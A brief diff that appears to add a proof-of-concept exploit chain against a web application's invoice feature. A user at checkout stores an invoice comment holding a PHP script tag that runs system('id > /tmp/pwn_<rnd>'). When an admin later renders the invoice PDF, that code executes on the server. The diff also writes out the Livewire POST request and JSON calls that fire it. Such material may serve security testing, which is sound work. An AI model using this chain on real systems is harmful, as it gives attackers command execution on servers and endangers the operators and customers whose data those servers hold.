@@ -1,0 +1,8 @@
+### (injection, as secretary at checkout) CheckoutPage stores data.invoice_comment verbatim:
+#   body = <script type="text/php"> system('id > /tmp/pwn_<rnd>'); </script>
+
+### (trigger, as admin over HTTP) render the invoice PDF
+POST /livewire-5f244c96/update   # admin session, ViewInvoice(4)
+
+{"components":[{"snapshot":"<ViewInvoice snapshot>","calls":[{"path":"","method":"mountAction","params":["download_pdf"]}]}]}
+{"components":[{"snapshot":"<ViewInvoice snapshot>","calls":[{"path":"","method":"callMountedAction","params":[]}]}]}
